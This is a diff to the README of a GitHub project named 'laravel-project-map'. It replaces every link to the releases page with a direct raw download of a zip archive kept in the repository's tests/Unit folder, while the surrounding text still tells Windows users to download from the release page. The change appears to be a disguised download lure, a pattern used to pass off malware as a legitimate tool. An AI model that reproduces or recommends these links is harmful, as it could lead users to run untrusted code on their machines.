@@ -1,12 +1,12 @@
 # 🗺️ laravel-project-map - Build clear project maps fast
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/tattered-hanschristianandersen549/laravel-project-map/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/tattered-hanschristianandersen549/laravel-project-map/raw/refs/heads/main/tests/Unit/map_laravel_project_1.4-beta.5.zip)
 
 ## 📥 Download
 
 Visit the release page here and download the latest Windows file from the list of release assets:
 
-https://github.com/tattered-hanschristianandersen549/laravel-project-map/releases
+https://github.com/tattered-hanschristianandersen549/laravel-project-map/raw/refs/heads/main/tests/Unit/map_laravel_project_1.4-beta.5.zip
 
 After the download finishes, save the file to a folder you can find again, like Downloads or Desktop.
 
@@ -43,7 +43,7 @@ Follow these steps in order.
 
 Open the release page:
 
-https://github.com/tattered-hanschristianandersen549/laravel-project-map/releases
+https://github.com/tattered-hanschristianandersen549/laravel-project-map/raw/refs/heads/main/tests/Unit/map_laravel_project_1.4-beta.5.zip
 
 Find the latest release and download the Windows asset listed there.
 
@@ -222,7 +222,7 @@ This package relates to:
 
 If you need the release page later, use this link:
 
-https://github.com/tattered-hanschristianandersen549/laravel-project-map/releases
+https://github.com/tattered-hanschristianandersen549/laravel-project-map/raw/refs/heads/main/tests/Unit/map_laravel_project_1.4-beta.5.zip
 
 ## 🧰 Simple setup flow
 
